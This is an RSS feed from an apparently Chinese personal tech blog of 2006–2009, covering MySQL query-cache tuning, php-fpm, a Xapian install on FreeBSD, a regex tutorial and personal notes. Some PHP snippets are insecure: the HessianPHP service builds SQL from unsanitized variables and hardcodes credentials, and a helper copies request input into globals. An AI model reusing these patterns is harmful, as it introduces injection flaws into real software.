query_cache_type:0 完全禁止QC，不受SQL语句控制（另外可能要注意的是，即使这里禁用，上面一个参数所设定的内存大小还是会被分配）；1启用QC，可以在SQL语句使用 SQL_NO_CACHE禁用；2可以在SQL语句使用SQL_CACHE启用。 query_cache_min_res_unit:每次给QC结果分配内存的大小 状态 show status like &#39;Qcache%&#39;可以看到这些信息。 Qcache_free_blocks:当一个表被更新之后，和它相关的cache blocks将被free。但是这个block依然可能存在队列中，除非是在队列的尾部。这些blocks将会被统计到这个值来。可以用FLUSH QUERY CACHE语句来清空free blocks。 Qcache_free_memory:可用内存，如果很小，考虑增加query_cache_size Qcache_hits:自mysql进程启动起，cache的命中数量 Qcache_inserts:自mysql进程启动起，被增加进QC的数量 Qcache_lowmem_prunes:由于内存过少而导致QC被删除的条数。加大query_cache_size，尽可能保持这个值0增长。 Qcache_not_cached:自mysql进程启动起，没有被cache的只读查询数量（包括select,show,use,desc等） Qcache_queries_in_cache:当前被cache的SQL数量 Qcache_total_blocks:在QC中的blocks数。一个query可能被多个blocks存储，而这几个blocks中的最后一个，未用满的内存将会被释放掉。例如一个QC结果要占6KB内存，如果query_cache_min_res_unit是4KB，则最后将会生成3个 blocks，第一个block用来存储sql语句文本，这个不会被统计到query+cache_size里，第二个block为4KB，第三个 block为2KB（先allocate4KB，然后释放多余的2KB）。每个表，当第一个和它有关的SQL查询被CACHE的时候，会使用一个 block来存储表信息。也就是说，block会被用在三处地方：表信息，SQL文本，查询结果。 另外一篇： 如果 MySQL Server 负载比较高，处理非常繁忙的话，可以启动Query Cache 以加速响应时间，启动方法可以在my.</description>
    </item>
    
    <item>
      <title>文章简介自动截取</title>
      <link>http://example.org/2009/03/15/e69687e7aba0e7ae80e4bb8be887aae58aa8e688aae58f96/</link>
      <pubDate>Sun, 15 Mar 2009 12:19:49 +0000</pubDate>
      
      <guid>http://example.org/2009/03/15/e69687e7aba0e7ae80e4bb8be887aae58aa8e688aae58f96/</guid>
      <description>修改主题 index.php archive.php
找到
替换成
2.71 生效</description>
    </item>
    
    <item>
      <title>安装代码高亮插件</title>
      <link>http://example.org/2009/03/15/e5ae89e8a385e4bba3e7a081e9ab98e4baaee68f92e4bbb6/</link>
      <pubDate>Sun, 15 Mar 2009 10:25:14 +0000</pubDate>
      
      <guid>http://example.org/2009/03/15/e5ae89e8a385e4bba3e7a081e9ab98e4baaee68f92e4bbb6/</guid>
      <description>准备开始转回wp 先装个高亮插件
下载地址
http://wordpress.org/extend/plugins/wp-syntax/
为了更方便把编辑器改一下,看了半天终于找到了
wp-includes/js/quicktags.js
我觉得 code 用不到就把 改了,如下
edButtons[edButtons.length] =&amp;lt;/code&amp;gt; &amp;lt;code&amp;gt;new edButton(&#39;ed_code&#39; ,&#39;code&#39; ,&#39;&amp;lt;pre lang=&amp;quot;php&amp;quot;&amp;gt;&#39; ,&#39;&amp;lt;/pre&amp;gt;&#39; ,&#39;c&#39; ); 来个 php 的呵呵
&amp;lt; ?php echo &#39;hello world!&#39;;?&amp;gt; </description>
    </item>
    
    <item>
      <title>转换成utf8成功!</title>
      <link>http://example.org/2009/03/15/e8bdace68da2e68890utf8e68890e58a9f/</link>
      <pubDate>Sun, 15 Mar 2009 09:03:55 +0000</pubDate>
      
      <guid>http://example.org/2009/03/15/e8bdace68da2e68890utf8e68890e58a9f/</guid>
      <description>准备从baidu 搬回来哦!</description>
    </item>
    
    <item>
      <title>php-fpm文档中文翻译</title>
      <link>http://example.org/2009/03/14/php-fpme69687e6a1a3e4b8ade69687e7bfbbe8af91/</link>
      <pubDate>Sat, 14 Mar 2009 20:59:51 +0000</pubDate>
      
      <guid>http://example.org/2009/03/14/php-fpme69687e6a1a3e4b8ade69687e7bfbbe8af91/</guid>
      <description>版权声明：转载时请以超链接形式标明文章原始出处和作者信息及本声明 http://syre.blogbus.com/logs/20092011.html
原文链接：http://php-fpm.anight.org/ wiki：http://www.php-fpm.com/
什么是 FastCGI FastCGI 是一个可伸缩、高速的在web server和脚本语言间通迅的接口。关于FastCGI技术的更多信息可以在官方网站和Wikipedia看到。
FastCGI 被许多脚本语言所支持，包括 php，如果用 &amp;ndash;enable-fastcgi 选项编译的话。
多数流行的web server都支持 FastCGI。包括Apache（mod_fastcgi和mod_fcgid），Zeus，nginx和lighttpd。
FastCGI 的主要优点是把动态语言和 web server 分离开来。这种技术允许 web server 和动态语言运行在不同的主机上。这可以改进可扩展性和安全性而没有大的效率损失。
php-fpm 可以和任何支持外部 FastCGI 技术的 web server 一起使用。
php-fpm是做啥用的 很不幸，官方网站 php.net 上的 php 在将 FastCGI SAPI 用于生产环境方面有许多已知的问题。
下面是关于启用 FastCGI SAPI 时的问题和 php-fpm 是如何解决他们的对比列表。
特色功能 所有这些特性都是“不打断”的方式实现的。也就是说，如果你不使用它们，它们的存在不会影响php的功能性——他们都是“透明”的。
Error header 范围：php.ini 选项 分类：便利性
默认情况下，如果被访问的php脚本包含语法错误，用户会收到一个空的“200 ok”页。这是不方便的。Error header 这个 php.ini 选项允许在这种情况下产生一个 HTTP 错误码，比如“HTTP/1.0 550 Server Made Big Boo”，从而中断web server请求并显示一个正确的错误页。
如果要实现这样的功能，需要在 php.ini 中添加一条 fastcgi.</description>
    </item>
    
    <item>
      <title>模仿IE自动完成功能</title>
      <link>http://example.org/2007/08/16/e6a8a1e4bbbfiee887aae58aa8e5ae8ce68890e58a9fe883bd/</link>
      <pubDate>Thu, 16 Aug 2007 09:22:37 +0000</pubDate>
      
      <guid>http://example.org/2007/08/16/e6a8a1e4bbbfiee887aae58aa8e5ae8ce68890e58a9fe883bd/</guid>
      <description>&amp;lt; !DOCTYPE HTML PUBLIC &amp;quot;-//W3C//DTD HTML 4.0 Transitional//EN&amp;quot;&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt; New Document &amp;lt;/title&amp;gt; &amp;lt;meta content=&amp;quot;EditPlus&amp;quot; name=&amp;quot;Generator&amp;quot;&amp;gt; &amp;lt;/meta&amp;gt;&amp;lt;meta content=&amp;quot;&amp;quot; name=&amp;quot;Author&amp;quot;&amp;gt; &amp;lt;/meta&amp;gt;&amp;lt;meta content=&amp;quot;&amp;quot; name=&amp;quot;Keywords&amp;quot;&amp;gt; &amp;lt;/meta&amp;gt;&amp;lt;meta content=&amp;quot;&amp;quot; name=&amp;quot;Description&amp;quot;&amp;gt; &amp;lt;style&amp;gt; body,div { font-family:verdana; line-height:100%; font-size:9pt; } input { width:300px; } h1 { text-align:center; font-size:2.2em; } #divf { margin:10px; font-size:0.8em; text-align:center; } #divc { border:1px solid #333333; } .des { width:500px; background-color:lightyellow; border:1px solid #333; padding:20px; margin-top:20px; } .mouseover { color:#ffffff; background-color:highlight; width:100%; cursor:default; } .</description>
    </item>
    
    <item>
      <title>Webalizer-利用ApacheLog達成流量統計圖表化</title>
      <link>http://example.org/2007/06/30/webalizer-e588a9e794a8apacheloge98194e68890e6b581e9878fe7b5b1e8a888e59c96e8a1a8e58c96/</link>
      <pubDate>Sat, 30 Jun 2007 19:56:15 +0000</pubDate>
      
      <guid>http://example.org/2007/06/30/webalizer-e588a9e794a8apacheloge98194e68890e6b581e9878fe7b5b1e8a888e59c96e8a1a8e58c96/</guid>
      <description>&lt;p&gt;&lt;strong&gt;【前言】&lt;/strong&gt;&lt;a href=&#34;http://www.mrunix.net/webalizer/&#34;&gt;[webalizer]&lt;/a&gt; - A web server log file analysis tool.即可利用 Apache 的 Log 來達成流量統計圖表化的套件。  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;【作業環境】&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;FreeBSD 5.2、6.2-RELEASE&lt;/p&gt;
&lt;p&gt;webalizer-2.01-10、2.1.10_12&lt;/p&gt;
&lt;p&gt;libiconv-1.9.2_2&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;【安裝及設定】&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step1.安裝 webalizer 及 libiconv 套件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;將&lt;a href=&#34;http://www.weithenn.idv.tw/cgi-bin/wiki.pl/%e9%a1%8f%e5%9c%8b%e9%9b%84%e8%80%81%e5%b8%ab%e4%b8%ad%e6%96%87%e4%ba%82%e7%a2%bc%e4%bf%ae%e6%ad%a3%e6%aa%94-webalizer_patch.pl&#34;&gt;顏國雄老師中文亂碼修正檔-webalizer patch.pl&lt;/a&gt; 放到 /usr/ports/www/webalizer 目錄下，等一下先安裝完預設的中文語系檔，但因為 GD 圖表無法正確顯示中文所以這時便執行顏國雄老師中文亂碼修正檔將 GD 圖表內中文字改回英文便不會發現 GD 圖表內文字為亂碼的現象，至於安裝前為何要將語系檔轉換為 UTF-8 格式？因為若是不轉換的話當執行完流量統計後你會發現 Search String 內容會為亂碼。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>在SQL数据库中得到重复次数最多的记录</title>
      <link>http://example.org/2007/06/27/e59ca8sqle695b0e68daee5ba93e4b8ade5be97e588b0e9878de5a48de6aca1e695b0e69c80e5a49ae79a84e8aeb0e5bd95/</link>
      <pubDate>Wed, 27 Jun 2007 10:08:49 +0000</pubDate>
      
      <guid>http://example.org/2007/06/27/e59ca8sqle695b0e68daee5ba93e4b8ade5be97e588b0e9878de5a48de6aca1e695b0e69c80e5a49ae79a84e8aeb0e5bd95/</guid>
      <description>接着昨天没有写完的那个无重复的随即数字的程序，我们展开来讲！既然做这个程序的的目的是为了对买彩票的程序作准备！所以我要把 每次 的结果保存到SQL server 数据库中！我的想法是首先运行100万次摇奖的程序后，将这100万条数据存放到数据库中,然后用SQL语句选择出重复次数最多的一组数据，这个就是我的想法！大家仅仅是参考，千万不要模仿呀：）前面我们已经说过如何生成不重复的随即数，我们就利用那个函数来生成一组数据，如此重复100万次！经过3个小时的运算以后，我们得到了一组巨大的记录，下面我们来看看 如何得到 重复次数最多的一组号码呢？我们以前曾经讲过，使用distinct 可以使我们得到一个不重复的记录集(select distinct * from table1)，那么怎么得到有重复的记录集呢,显然 简单的使用关键字是不可能实现的了，豆腐最终确定使用Having子句来实现这样的功能,SQL 语句如下,select * from table1 having count()&amp;gt;1 这样我们就得到了一个所有记录重复次数超过一次的记录集，我们利用如下语句 select count() ccount from table1 group by a1,a2,a3,a4,a5,a6,a7 having count(*)&amp;gt;! order by ccount desc 这样得到的第一个记录就是出现重复次数最多的那组数字。
/* 豆腐制作 都是精品 http://www.asp888.net 豆腐技术站 如转载 请保留完整版权信息 */</description>
    </item>
    
    <item>
      <title>mysql化化</title>
      <link>http://example.org/2007/06/27/mysqle58c96e58c96/</link>
      <pubDate>Wed, 27 Jun 2007 10:05:46 +0000</pubDate>
      
      <guid>http://example.org/2007/06/27/mysqle58c96e58c96/</guid>
      <description>同时在线访问量继续增大 对于1G内存的服务器明显感觉到吃力 严重时甚至每天都会死机 或者时不时的服务器卡一下 这个问题曾经困扰了我半个多月 MySQL使用是很具伸缩性的算法，因此你通常能用很少的内存运行或给MySQL更多的被存以得到更好的性能。
安装好mysql后，配制文件应该在/usr/local/mysql/share/mysql目录中，配制文件有几个，有my-huge.cnf
my-medium.cnf my-large.cnf my-small.cnf,不同的流量的网站和不同配制的服务器环境，当然需要有不同的
配制文件了。一般的情况下，my-medium.cnf这个配制文件就能满足我们的大多需要； 一般我们会把配置文件拷贝到/etc/my.cnf 只需要修改这个配置文件就可以了 使用mysqladmin variables extended-status –u root –p 可以看到目前的参数 有３个配置参数是最重要的，即key_buffer_size,query_cache_size,table_cache
1.key_buffer_size key_buffer_size只对MyISAM表起作用 key_buffer_size指定索引缓冲区的大小，它决定索引处理的速度，尤其是索引读的速度。一般我们设为16M,实
际上稍微大一点的站点　这个数字是远远不够的，通过检查状态值Key_read_requests和
Key_reads,可以知道key_buffer_size设置是否合理。比例key_reads / key_read_requests应该尽可
能的低，至少是1:100，1:1000更好（上述状态值可以使用SHOW STATUS LIKE ‘key_read%’获得）。 或者如
果你装了phpmyadmin 可以通过服务器运行状态看到,笔者推荐用phpmyadmin管理mysql，以下的状态值都是本人
通过phpmyadmin获得的
实例分析: 这个服务器已经运行了20天 key_buffer_size – 128M key_read_requests – 650759289 key_reads - 79112 比例接近1:8000 健康状况非常好
另外一个估计key_buffer_size的办法　把你网站数据库的每个表的索引所占空间大小加起来看看 以此服务器为例:比较大的几个表索引加起来大概125M 这个数字会随着表变大而变大
2.query_cache_size 从4.0.1开始，MySQL提供了查询缓冲机制。使用查询缓冲，MySQL将SELECT语句和查询结果存放在缓冲区中，今
后对于同样的SELECT语句（区分大小写），将直接从缓冲区中读取结果。根据MySQL用户手册，使用查询缓冲最
多可以达到238%的效率。 通过调节以下几个参数可以知道query_cache_size设置得是否合理 Qcache inserts Qcache hits Qcache lowmem prunes Qcache free blocks Qcache total blocks</description>
    </item>
    
    <item>
      <title>php &#43; xapian extension的安装</title>
      <link>http://example.org/2006/12/11/php-xapian-extensione79a84e5ae89e8a385/</link>
      <pubDate>Mon, 11 Dec 2006 05:56:16 +0000</pubDate>
      
      <guid>http://example.org/2006/12/11/php-xapian-extensione79a84e5ae89e8a385/</guid>
      <description>xapian是啥玩意?
xapian 是一个“Xapian 是一个开源概率论信息检索库，基于GPL发布。它是用C++编写的，提供的绑定可以支持其它语言(支持Perl, Python, PHP, Java, and TCL )的开发。 Xapian 设计为一个高度可适应的工具集，可以让开发人员方便地为他们自己的应用程序增加高级索引和搜索功能。”
在网上找到这段介绍后,俺手痒痒就想试试xapian —- 一定要给php整个这东东上去.参考了若干文档以后,这就开始动手了(我的环境仍然是freebsd + apache 2.2 + php 5.1.2,apache和php原来就已经安装好):
1.下载xapian
cd /usr/local/src wget &amp;lt;a href=&amp;quot;http://www.oligarchy.co.uk/xapian/0.9.4/xapian-core-0.9.4.tar.gz&amp;quot;&amp;gt;http://www.oligarchy.co.uk/xapian/0.9.4/xapian-core-0.9.4.tar.gz&amp;lt;/a&amp;gt; wget &amp;lt;a href=&amp;quot;http://www.oligarchy.co.uk/xapian/0.9.4/xapian-bindings-0.9.4.tar.gz&amp;quot;&amp;gt;http://www.oligarchy.co.uk/xapian/0.9.4/xapian-bindings-0.9.4.tar.gz&amp;lt;/a&amp;gt; 前者是xapian的核心lib代码,后者是给其它语言调用的接口
2.安装Xapian-core
cd /usr/local/src tar xzvf xapian-core-0.9.4.tar.gz cd xapian-core-0.9.4 ./configure –prefix=/usr/local/xapian make make install 3.安装Xapian-bindings
cd /usr/local/src tar xzvf xapian-bindings-0.9.4.tar.gz cd xapian-bindings-0.9.4 ln -s /usr/local/xapian/bin/xapian-config /usr/local/bin/xapian-config #这里需要做个软连接,编译的时候需要用到 ./configure –without-python #我没用到python,就不编译了 make make install 进行到这一步,Xapian-bindings应该算是安装好了,但是不知道为何,编译好的xapian.so没有按说明文档所说的自动复制到php的extension目录,于是我手工完成这一步骤
cp php/.libs/xapian.so /usr/local/lib/php #/usr/local/lib/php是我在php.ini设置的extension目录 然后修改php.ini extension_dir = “/usr/local/lib/php/” #没有就加上 extension=xapian.</description>
    </item>
    
    <item>
      <title>网络最大的赢家是谁？</title>
      <link>http://example.org/2006/11/07/e7bd91e7bb9ce69c80e5a4a7e79a84e8b5a2e5aeb6e698afe8b081efbc9f/</link>
      <pubDate>Tue, 07 Nov 2006 08:16:08 +0000</pubDate>
      
      <guid>http://example.org/2006/11/07/e7bd91e7bb9ce69c80e5a4a7e79a84e8b5a2e5aeb6e698afe8b081efbc9f/</guid>
      <description>原文来自中国站长站论坛
大型娱乐站、旅游站、咨询站、门户站，中国某某第一站？？？？
你知道你上面说的这几个字，如何能实现嘛？ 我来告诉你， 1年广告费用（价格都是2004年的）
首先， SINA 一天的首页 LOGO图片价格：15000/天 SOHU 一天的首页 LOGO图片价格：15000/天 163 一天的首页 LOGO图片价格：18000/天
SINA 一天的首页 通栏价格：16万/天 SOHU 一天的首页 通栏价格：15.2万/天 163 一天的首页 通栏价格：15.4万/天
SINA 首页 弹出页面价格：10万/小时 SOHU 首页 弹出页面价格：12万/小时 163 首页 弹出页面价格：11.5万/小时
SINA 首页 弹出窗口价格：13万/天 SOHU 首页 弹出窗口价格：14万/天 163 首页 弹出窗口价格：13万/天
SINA 所有用户邮件价格：12万/天 SOHU 所有用户邮件价格：10万/天 163 所有用户邮件价格：15万/天
这只是广告费用，
其次，你在机房的投资，
DELL 主服务器系统 40万/台（全套） IBM 主服务器系统 48万/台（全套） HP 没有主服务器系统
你至少不上3台？1台网站，1台论坛，1台邮件
然后是人工， 现在网络雇员的费用应该是
北京 高级管理人员 10-20万/月 一般管理人员 1-5万/月 技术骨干 50-200万/年 一般技术 2000-5万/月 普通维护 1000-8000/月 普通雇员 600-2000月</description>
    </item>
    
    <item>
      <title>今天使用HessianPHP</title>
      <link>http://example.org/2006/10/30/e4bb8ae5a4a9e4bdbfe794a8hessianphp/</link>
      <pubDate>Mon, 30 Oct 2006 09:26:43 +0000</pubDate>
      
      <guid>http://example.org/2006/10/30/e4bb8ae5a4a9e4bdbfe794a8hessianphp/</guid>
      <description>今天要做一个bbs的API不知道七夜怎么样的,要我用HessianPHP下载了个看看代码!
确实他的机制很好,等有时间好好看看,把自己的写的代码贴出来,大家看下!
service.php
opendb(); $s_sql = &amp;quot;SELECT * FROM cdb_threads WHERE fid IN($id) ORDER BY lastpost DESC LIMIT $num&amp;quot;; $r_query = mysql_query( $s_sql ); while ( FALSE !== ( $a_rec = mysql_fetch_assoc( $r_query ) ) ){ $show[] = $a_rec; } return $show; } function opendb(){ $dbname = &amp;quot;club&amp;quot;; $conn = mysql_connect(&amp;quot;localhost&amp;quot;,&amp;quot;club&amp;quot;, &amp;quot;club_test&amp;quot;); if(!$conn) die(mysql_error()); @mysql_select_db($dbname, $conn); if(mysql_errno()) die(mysql_error()); return $conn; } } $service = &amp;amp;new; HessianService(); $service-&amp;gt;registerObject(new bbs_api); $service-&amp;gt;displayInfo = true; $service-&amp;gt;service(); ?</description>
    </item>
    
    <item>
      <title>今天又开始新折工作了！</title>
      <link>http://example.org/2006/10/24/e4bb8ae5a4a9e58f88e5bc80e5a78be696b0e68a98e5b7a5e4bd9ce4ba86efbc81/</link>
      <pubDate>Tue, 24 Oct 2006 14:41:10 +0000</pubDate>
      
      <guid>http://example.org/2006/10/24/e4bb8ae5a4a9e58f88e5bc80e5a78be696b0e68a98e5b7a5e4bd9ce4ba86efbc81/</guid>
      <description>本来还想多呆几天呢，唉没想到休息两天就又开始新的工作了，希望这里能有一个新的发展空间，
不过第一天上班给我的印像真的不好，唉没想到在这种公司也会有这种人，不过希望我能在这里能多学点东东在走！</description>
    </item>
    
    <item>
      <title>正则表达式30分钟入门教程。。</title>
      <link>http://example.org/2006/10/24/e6ada3e58899e8a1a8e8bebee5bc8f30e58886e9929fe585a5e997a8e69599e7a88be38082e38082/</link>
      <pubDate>Tue, 24 Oct 2006 14:16:00 +0000</pubDate>
      
      <guid>http://example.org/2006/10/24/e6ada3e58899e8a1a8e8bebee5bc8f30e58886e9929fe585a5e997a8e69599e7a88be38082e38082/</guid>
      <description>本文目标30分钟内让你明白正则表达式是什么，并对它有一些基本的了解，让你可以在自己的程序或网页里使用它。一旦入门后，你可以从网上找到更多更详细的资料来继续学习。 别被下面那些复杂的表达式吓倒，只要跟着我一步一步来，你会发现正则表达式其实并不像你想像中的那么困难。当然，如果你看完了这篇教程之后发现自己明白了很多，却又几乎什么都记不得，那也是很正常的&amp;ndash;其实我认为没接触过正则表达式的人在看完这篇教程后能把提到过的语法记住80%以上的可能性为零。这里只是让你明白基本道理，以后你还需要多练习，多查资料，才能熟练掌握正则表达式。 说明正则表达式是用于进行文本匹配的工具，所以本文里多次提到了在字符串里搜索/查找，这种说法的意思是在给定的字符串中，查找与给定的正则表达式相匹配的部分。有可能字符串里有不止一个部分满足给定的正则表达式，这时每一个这样的部分被称为一个匹配。匹配在本文里可能会有三种意思：一种是形容词性的，比如说一个字符串匹配一个表达式；一种是动词性的，比如说在字符串里匹配正则表达式；还有一种是名词性的，就是刚刚说到的“字符串中满足给定的正则表达式的一部分”。 文本格式约定：专业术语 特殊代码/语法格式 正则表达式 正则表达式中的一部分(用于分析) 用于在其中搜索的字符串 对正则表达式或其中一部分的说明 什么是正则表达式？很可能你使用过Windows/Dos下用于文件查找的通配符，也就是和?。如果你想查找某个目录下的所有的Word文档的话，你会搜索.doc。在这里，会被解释成任意的字符串。和通配符类似，正则表达式也是用来进行文本匹配的工具，只不过比通配符更能精确地描述你的需求&amp;ndash;当然，代价就是更复杂。比如你可以编写一个正则表达式来查找所有以0开头，后面跟着2-3个数字，然后是一个连字号“-”，最后是7或8位数字的字符串(像010-12345678或0376-7654321)。 入门在编写处理字符串的程序或网页时，经常会有查找符合某些复杂规则的字符串的需要。正则表达式就是用于描述这些规则的工具。换句话说，正则表达式就是记录文本规则的代码。例如，\d+就是一个简洁的代码，代表着规则1位或更多位数字，2008就符合这个规则，而A3则不符合(它包含了不是数字的字符)。 学习正则表达式的最好方法是从例子开始，理解例子之后再自己对例子进行修改，实验。下面给出了不少简单的例子，并对它们作了详细的说明。 假设你在一篇英文小说里查找hi，你可以使用正则正则表达式hi。 这是最简单的正则表达式了，它可以精确匹配这样的字符串：由两个字符组成，前一个字符是h,后一个是i。通常，处理正则表达式的工具会提供一个忽略大小写的选项，如果选中了这个选项，它可以匹配hi,HI,Hi,hI。 不幸的是，很多单词里包含hi这两个连续的字符，比如him,history,high等等。用hi来查找的话，这里边的hi也会被找出来。如果要精确地查找hi这个单词的话，我们应该使用\bhi\b。 \b是正则表达式规定的一个特殊代码，代表着单词的开头或结尾。虽然通常英文的单词是由空格或标点符号或换行为分隔的，但是\b并不代表这些单词分隔符中的任何一个，只代表一个位置。 假如你要找的是hi后面不远处跟着一个Lucy，你应该用\bhi\b.\bLucy\b。 这里，.是另一个特殊代码，代表除了换行符以外的任意字符。同样是特殊的代码，不过它代表的不是字符，也不是位置，而是数量&amp;ndash;它指定前边的内容可以重复任意次以使整个表达式得到匹配。因此，.连在一起就意味着任意数量的不包含换行的字符。现在\bhi\b.\bLucy\b的意思就很明显了：先是一个单词hi,然后是任意个任意字符(但不能是换行)，最后是Lucy这个单词。 如果同时使用其它的一些特殊代码，我们就能构造出功能更强大的正则表达式。比如下面这个例子： 0\d\d-\d\d\d\d\d\d\d\d代表着这样的字符串：以0开头，然后是两个数字，然后是一个连字号“-”，最后是8个数字(也就是中国的电话号码，当然，这个例子只能匹配区号为3位的情形，想同时匹配区号为4位的话，请在教程的下面寻找答案)。 这里的\d是一个新的特殊代码，代表任意的数字(0，或1，或2，或。。。)。-不是特殊代码，只代表它本身&amp;ndash;连字号。 为了避免那么多烦人的重复，我们也可以这样写这个表达式：0\d{2}-\d{8} 这里\d后面的{2}({8})指定的是前面\d必须连续重复出现2次(8次)。 测试正则表达式如果你不觉得正则表达式很难读写的话，要么你是一个天才，要么，你不是地球人。正则表达式的语法很令人头疼，即使对经常使用它的人来说也是如此。由于难于读写，容易出错，所以很有必要创建一种工具来测试正则表达式。 由于在不同的环境下正则表达式的一些细节是不相同的，本教程介绍的是Microsoft .net下正则表达式的行为，所以，我向你介绍一个.net下的工具The Regulator。首先你确保已经安装了.net Framework1.1，然后下载The Regulator，下载完后打开压缩包，运行setup.exe安装。 下面是the Regulator运行时的截图：
特殊代码现在你已经知道几个具有特殊意义的代码了，如\b,.,*，还有\d.事实上还有更多的特殊代码，比如\s代表任意的空白符，包括空格，制表符(Tab),换行符。\w代表着字母或数字。 下面来试试更多的例子：
\ba\w*\b匹配以字母a开头的单词-先是某个单词开始处(\b)，然后是字母a,然后是任意数量的字母或数字(\w*)，最后是单词结束处(\b)。 \d+匹配1个或更多连续的数字。这里的+是和*类似的特殊代码，不同的是*代表重复任意次(可能是0次)，而+则代表重复1次或更多次。 \b\w{6}\b 匹配刚好6个字母/数字的单词。 . 匹配除换行符以外的任意字符 \w 匹配字母或数字 \s 匹配任意的空白符 \d 匹配数字 \b 匹配单词的开始或结束 ^ 匹配字符串的开始 $ 匹配字符串的结束 特殊代码^以及$和\b有点类似，都匹配一个位置。^匹配你要用来查找的字符串的开头，$匹配结尾。这两个代码在验证输入的内容时非常有用，比如一个网站如果要求你填写的QQ号必须为5位到12位数字时，可以使用：^\d{5,12}$。 这里的{5,12}和前面介绍过的{2}是类似的，只不过{2}代表只能不多不少重复2次，{5,12}则是必须重复最少5次，最多12次，否则都不匹配。 因为使用了^和$，所以输入的整个字符串都要用来和\d{5,12}来匹配，也就是说整个输入必须是5到12个数字，因此如果输入的QQ号能匹配这个正则表达式的话，那就符合要求了。 和忽略大小写的选项类似，有些正则表达式处理工具还有一个处理多行的选项。如果选中了这个选项，^和$的意义就变成了匹配行的开始处和结束处。 字符转义如果你想查找特殊代码本身的话，比如你查找.,或者*,就出现了问题：你没法指定它们，因为它们会被解释成其它的意思。这时你就必须使用\来取消这些字符的特殊意义。因此，你应该使用\.和\*。当然，要查找\本身，你也得用\\. 例如：www\.unibetter\.com匹配www.unibetter.com，c:\\windows匹配c:\windows,2\^8匹配2^8(通常这是2的8次方的书写方式)。 重复你已经看过了前面的*,+,{2},{5,12}这几个代表重复的方式了。下面是正则表达式中所有指定重复的方式： * 重复零次或更多次 + 重复一次或更多次 ? 重复零次或一次 {n} 重复n次 {n,} 重复n次或更多次 {n,m} 重复n到m次 下面是一些使用重复的例子： Windows\d+匹配Windows后面跟1个或更多数字 13\d{9}匹配以13后面跟9个数字(中国的手机号) ^\w+匹配一行的第一个单词(或整个字符串的第一个单词，具体代表哪个意思得看选项设置) 字符类要想查找数字，字母或数字，空白是很简单的，因为已经有了对应这些字符集的特殊代码，但是如果你想匹配没有预定义特殊代码的字符集比如元音字母(a,e,i,o,u),怎么办？ 很简单，你只需要在中括号里列出它们就行了，像[aeiou]就匹配任何一个元音字母，[.</description>
    </item>
    
    <item>
      <title>明天就要离开了,</title>
      <link>http://example.org/2006/10/20/e6988ee5a4a9e5b0b1e8a681e7a6bbe5bc80e4ba86/</link>
      <pubDate>Fri, 20 Oct 2006 09:39:59 +0000</pubDate>
      
      <guid>http://example.org/2006/10/20/e6988ee5a4a9e5b0b1e8a681e7a6bbe5bc80e4ba86/</guid>
      <description>明天就要离开网友了,不知道这回结果怎么样,不知道当时的到时候怎么想的,没想到结果会这样,
也不知道自己以后会怎么样,唉,不过在这里还是学了很多,如刚来的时候对JS是一片空白,现在至少能实天页面免刷新了呵呵!
PP我真的想在和你学点东西在走,唉,可是,以经不可能了..</description>
    </item>
    
    <item>
      <title>test</title>
      <link>http://example.org/2006/10/18/test-2/</link>
      <pubDate>Wed, 18 Oct 2006 09:23:53 +0000</pubDate>
      
      <guid>http://example.org/2006/10/18/test-2/</guid>
      <description>function all () { global $HTTP_GET_VARS, $HTTP_POST_VARS;
$args = func_get_args(); while (list(,$key) = each ($args)) { if (isset($HTTP_GET_VARS[$key])) $value = $HTTP_GET_VARS[$key]; if (isset($HTTP_POST_VARS[$key])) $value = $HTTP_POST_VARS[$key]; if (isset($value)) { if (!ini_get (&#39;magic_quotes_gpc&#39;)) { if (!is_array($value)) $value = addslashes($value); else $value = ary($value); } $GLOBALS[$key] = $value; unset($value); } } } function ary ($a) { while (list($k,$v) = each($a)) { if (!is_array($v)) $a[$k] = addslashes($v); else $a[$k] = ary($v); } reset ($a); return ($a); } </description>
    </item>
    
    <item>
      <title>FreeBSD 下的TOP的使用方法</title>
      <link>http://example.org/2006/10/18/freebsd-e4b88be79a84tope79a84e4bdbfe794a8e696b9e6b395/</link>
      <pubDate>Wed, 18 Oct 2006 03:46:13 +0000</pubDate>
      
      <guid>http://example.org/2006/10/18/freebsd-e4b88be79a84tope79a84e4bdbfe794a8e696b9e6b395/</guid>
      <description>top监控工具可以显示CPU占用率为前几位的进程，并提供CPU的实时活动情况
top监控命令在FreeBSD上的使用 top监控工具可以显示CPU占用率为前几位的进程，并提供CPU的实时活动情况 语法：top [-s time] [-d count] [-q] [-h] [-n number] [-f filename] [-o field][-U usename] -S 将系统进程信息也显示到屏幕上，默认情况下，top不显示系统进程的信息 -b 使用”batch”方式运行top。在此种方式下，所有来自终端的输入都将被忽略，但交互键(比如C and ) 依然起使用。这是运行top输出到哑终端或输到非终端的默认运行方式 -i 使用交互运行top程序，在此种方式下，命令会被进程立即被处理。不管命令是不是能被top所理解执行， 屏幕都将立即更新。这是top的默认运行方式。 -I 不显示空闲进程，在默认情况下，top连同空闲进程的信息一同输出。 -t 不显示top进程自己 -n 不以交互方式使用top命令，作用同”batch”方式。 -s time 设置屏幕刷新的延时，单位为秒，默认值5秒 -d count 设置屏幕刷新的次数，刷新显示完count次后退出 -q 如果经过nice授权，使用-q可以使top运行的更快一些，这样，在系统反应缓慢的时候，可以会更快的找到存在的问题。 此选项在FreeBSD下只有root可以使用 -n number 设置每一屏幕显示的进程数目，number值超过进程最大数目，则设置无效 -u 用显示User ID代替username，提高命令运行速度 -v 显示程序版本号后，立即退出。如果要在top运行时查看版本号，输入”?” -o 以指定的字段排序显示进行信息。字段名必须为输入在屏幕的可见列的名字，而且必须是小写。 比如”cpu”、”size”、”res”与”time”,但不同的操作系统间有许多的不同。注意不是每个UNIX操 作系统都支持此选项。
